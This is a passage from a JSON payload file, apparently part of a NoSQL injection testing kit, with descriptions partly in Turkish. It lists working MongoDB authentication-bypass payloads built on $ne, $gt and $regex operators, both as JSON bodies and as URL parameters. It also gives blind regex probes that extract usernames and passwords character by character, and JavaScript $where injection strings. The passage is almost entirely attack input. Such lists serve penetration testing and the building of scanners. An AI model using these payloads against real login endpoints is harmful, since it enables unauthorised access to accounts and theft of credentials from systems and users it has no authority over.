    "risk": "Critical",
    "authentication_bypass": {
      "desc": "Authentication bypass payloads",
      "json_payloads": [
        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
        "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
        "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
        "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}",
        "{\"username\": \"admin\", \"password\": {\"$ne\": 1}}"
      ],
      "url_payloads": [
        "username[$ne]=admin&password[$ne]=pass",
        "username[$gt]=&password[$gt]=",
        "username[$regex]=.*&password[$regex]=.*",
        "username=admin&password[$ne]=1"
      ]
    },
    "data_extraction": {
      "desc": "Regex ile veri extraction",
      "examples": [
        "{\"username\": {\"$regex\": \"^a\"}}",
        "{\"username\": {\"$regex\": \"^ad\"}}",
        "{\"username\": {\"$regex\": \"^adm\"}}",
        "{\"password\": {\"$regex\": \"^p.*\"}}",
        "{\"password\": {\"$regex\": \"^[a-z].*\"}}"
      ],
      "purpose": "Blind NoSQL injection ile veri çıkarma"
    },
    "javascript_injection": {
      "desc": "JavaScript injection (where, $where kullanımı)",
      "examples": [
        "' || '1'=='1",
        "' || this.password.match(/^a.*$/) || '",
        "'; return true; var x='",
        "'; return this.username == 'admin'; var x='"
      ],
      "purpose": "MongoDB JavaScript context injection"
    },
    "operators": {
      "comparison": [
